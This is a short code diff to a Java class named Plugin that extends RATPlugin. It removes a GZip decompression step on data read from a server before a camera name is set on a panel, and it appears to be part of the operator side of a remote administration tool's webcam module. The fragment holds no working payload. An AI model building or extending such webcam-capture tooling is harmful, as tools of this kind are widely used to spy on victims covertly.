@@ -66,8 +66,6 @@ public class Plugin extends RATPlugin {
 				byte[] buffer = new byte[size];
 				event.getServer().getDataReader().readFully(buffer, 0, buffer.length);
 				
-				buffer = GZip.decompress(buffer);
-
 				if (panel != null) {
 					panel.setCamName(name);
 
